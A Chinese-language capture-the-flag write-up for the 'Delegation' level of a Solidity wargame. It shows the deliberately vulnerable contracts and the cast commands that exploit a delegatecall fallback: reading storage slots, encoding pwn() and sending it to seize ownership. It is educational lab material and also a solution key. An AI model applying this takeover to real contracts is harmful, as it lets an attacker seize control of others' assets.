### 第6关：Delegation

这一关目的是要修改目标合约的 owner 变量为攻击者的地址。
题目的上半部分给了一个代理合约的代码, 下半部分是要攻击的合约 Delegation 的代码：
```solidity
contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}
///////////////////////////////////
contract Delegation {
    address public owner;
    Delegate delegate;
...
    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```




我们的思路是：
**地址 A 通过合约 B 的 delegatecall() 去调用 合约 C ，从而导致 B 的变量被修改。（这要求 B 的变量必须和目标合约 C 的变量存储布局必须相同）**
*delegatecall() 与 call() 的区别在于：delegatecall() 相当于 B 在自己的上下文环境中运行 C 的代码，影响的是 B 家里的变量。而 call() 是在直接在 C 的上下文环境中运行 C 的代码，影响的是 C 家里的变量。*

**此时我们如果调用 B 合约， 而 B 合约中没有任何匹配的函数时，会触发 B 的 fallback 函数。（如果有 fallback 的话）**

*使用 foundry cast 来读取存储槽，可以读取到公共变量 owner 和私有变量 delegate（分别存储在 0号存储槽 和 1号存储槽）。进而可以查看目标合约与代理合约的变量布局。*
```shell
cast storage 0x目标合约地址 0  --rpc-url=https://blastapi.io
cast storage 0x目标合约地址 1  --rpc-url=https://blastapi.io
 ```

首先构造 .delegatecall(msg.data); 里面的 msg.data，也就是代理合约中的 pwn()函数，
我们使用 foundry cast 对拟调用的 pwn() 进行ABI编码，得到 0xdd365b8b ：
 ```shell
cast calldata "pwn()"
 ```
然后将 msg.data 发给目标合约：
 ```shell
cast send 0x目标合约地址 0xdd365b8b  --rpc-url=https://public.blastapi.io  --private-key=攻击者私钥
 ```

 点击 Submit Instance, 过关。
